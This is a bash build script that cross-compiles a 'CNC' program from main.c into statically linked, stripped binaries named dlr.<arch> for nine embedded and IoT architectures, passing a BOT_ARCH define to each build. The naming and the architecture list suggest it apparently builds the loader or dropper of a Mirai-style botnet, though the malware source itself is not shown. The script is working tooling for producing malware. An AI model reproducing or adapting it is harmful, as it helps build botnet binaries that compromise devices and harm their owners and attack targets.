#!/bin/bash
set -e

# =======================================
# build.sh
# Build CNC binaries for multiple architectures
# =======================================

# =======================================
# Colors
# =======================================
if command -v tput >/dev/null 2>&1 && [ -t 1 ]; then
    RED="$(tput setaf 1)"
    GREEN="$(tput setaf 2)"
    YELLOW="$(tput setaf 3)"
    BLUE="$(tput setaf 4)"
    CYAN="$(tput setaf 6)"
    BOLD="$(tput bold)"
    RESET="$(tput sgr0)"
else
    RED=""
    GREEN=""
    YELLOW=""
    BLUE=""
    CYAN=""
    BOLD=""
    RESET=""
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTDIR="$SCRIPT_DIR/bins"

function print_help {
    echo -e "${CYAN}==================== HELP ====================${RESET}"
    echo -e "${BOLD}Usage:${RESET} $0"
    echo
    echo "Builds CNC binaries for multiple architectures."
    echo
    echo -e "${BOLD}Note:${RESET} If ${YELLOW}bins${RESET} directory exists, you will be prompted before deleting it."
    echo -e "${CYAN}==============================================${RESET}"
}

function print_error {
    echo -e "${RED}[!] $1${RESET}"
    exit 1
}

# =======================================
# Architectures
# =======================================
declare -A ARCHS=(
    [arm]="armv4l-gcc"
    [arm7]="armv6l-gcc"
    [x86]="i686-gcc"
    [m68k]="m68k-gcc"
    [mips]="mips-gcc"
    [mpsl]="mipsel-gcc"
    [ppc]="powerpc-gcc"
    [sh4]="sh4-gcc"
    [spc]="sparc-gcc"
)

# =======================================
# Show help if requested
# =======================================
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    print_help
    exit 0
fi

# =======================================
# Prompt for existing bins
# =======================================
if [[ -d "$OUTDIR" ]]; then
    echo -e "${YELLOW}[!] ${RESET}Bins directory already exists."
    read -p "Do you want to delete it and rebuild? (y/N): " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        rm -rf "$OUTDIR"
        echo -e "${GREEN}[+]${RESET} Old bins directory deleted."
    else
        echo -e "${CYAN}[*] Using existing binaries in $OUTDIR.${RESET}"
        exit 0
    fi
fi

mkdir -p "$OUTDIR"

echo -e "${BLUE}==================== BUILD START ====================${RESET}"

# =======================================
# Build
# =======================================
for arch in "${!ARCHS[@]}"; do
    echo -e "${BLUE}==================== $arch BUILD ====================${RESET}"
    compiler="${ARCHS[$arch]}"
    outfile="$OUTDIR/dlr.$arch"

    echo -e "${CYAN}[*] Building $arch binary...${RESET}"

    # Check if compiler exists
    if ! command -v "$compiler" >/dev/null 2>&1; then
        print_error "Compiler '$compiler' not found for architecture '$arch'."
    fi

    # Compile
    if ! "$compiler" -Os -D BOT_ARCH="\"$arch\"" -D "${arch^^}" \
        -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start \
        -nostartfiles -static $SCRIPT_DIR/main.c -o "$outfile"; then
        print_error "Failed to compile $arch binary."
    fi

    # Strip
    strip_cmd="${compiler%-gcc}-strip"
    if command -v "$strip_cmd" >/dev/null 2>&1; then
        "$strip_cmd" -S --strip-unneeded \
            --remove-section=.note.gnu.gold-version \
            --remove-section=.comment \
            --remove-section=.note \
            --remove-section=.note.gnu.build-id \
            --remove-section=.note.ABI-tag \
            --remove-section=.jcr \
            --remove-section=.got.plt \
            --remove-section=.eh_frame \
            --remove-section=.eh_frame_ptr \
            --remove-section=.eh_frame_hdr "$outfile"
    else
        echo -e "${YELLOW}[!] Strip tool '$strip_cmd' not found. Binary is not stripped.${RESET}"
    fi

    echo -e "${GREEN}[+] $arch binary ready at $outfile${RESET}"
    echo -e "${BLUE}=====================================================${RESET}"
done

echo -e "${YELLOW}==================== BUILD COMPLETE ====================${RESET}"
echo -e "${GREEN}[*] All binaries are ready in ${GREEN}$OUTDIR${RESET}"
echo -e "${YELLOW}========================================================${RESET}"

exit 0
